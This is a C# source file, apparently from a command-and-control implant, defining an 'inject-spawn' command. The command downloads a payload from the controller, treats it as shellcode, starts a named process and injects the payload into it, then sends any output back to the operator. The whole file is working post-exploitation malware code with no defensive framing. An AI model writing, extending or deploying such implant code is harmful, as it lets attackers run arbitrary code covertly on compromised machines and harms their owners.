using Agent.Internal;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class SpawnInjectCommand : AgentCommand
    {
        public override string Name => "inject-spawn";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (task.SplittedArgs.Length < 1)
            {
                result.Result = $"Usage: {this.Name}  Process_Name_To_Start";
                return;
            }

            var fileName = task.FileId;
            var fileContent = commm.Download(task.FileId, a =>
            {
                result.Info = $"Downloading {fileName} ({a}%)";
                commm.SendResult(result);
            }).Result;

            this.Notify(result, commm, $"{fileName} Downloaded");

            var shellcode = fileContent;

            var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[0]);
            if(!injectRes.Succeed)
                result.Result += $"Injection failed : {injectRes.Error}";
            else
            {
                result.Result += $"Injection succeed!" + Environment.NewLine;
                if (!string.IsNullOrEmpty(injectRes.Output))
                    result.Result += injectRes.Output;
            }
        }
    }
}
